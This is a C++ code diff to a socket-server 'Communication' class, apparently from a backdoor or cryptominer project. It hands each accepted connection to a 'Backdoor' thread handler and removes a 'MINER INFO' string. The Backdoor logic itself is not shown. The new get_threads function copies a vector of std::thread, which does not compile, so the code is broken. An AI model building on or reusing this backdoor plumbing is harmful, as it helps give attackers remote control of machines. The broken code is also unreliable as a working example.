@@ -1,4 +1,5 @@
 #include "communication.h"
+#include "backdoor.h"
 
 /* Client functions */
 
@@ -83,13 +84,13 @@ void Communication::listen_forever(){
 
     for(int i = 0; i < MAX_CONNECTIONS; i++){
 
-
         if ((new_socket = accept(server_fd, (struct sockaddr *)&address, 
                         (socklen_t*)&addrlen))<0){
             Error::log_error("accept");
         }
 
-        std::thread(Backdoor());
+        
+        threads.push_back(std::thread(Backdoor(new_socket, this, true)));
         
         this->sockets.push_back(new_socket);
     }
@@ -118,11 +119,11 @@ void Communication::send_message(int sock, char * message){
 }
 
 
-std::string Communication::connection_ip(){
-    return std::string("MINER INFO - IP - ");    
+std::vector<int> Communication::get_sockets(){
+    return this->sockets;
 }
 
 
-std::vector<int> Communication::get_sockets(){
-    return this->sockets;
+std::vector<std::thread> Communication::get_threads(){
+    return this->threads;
 }
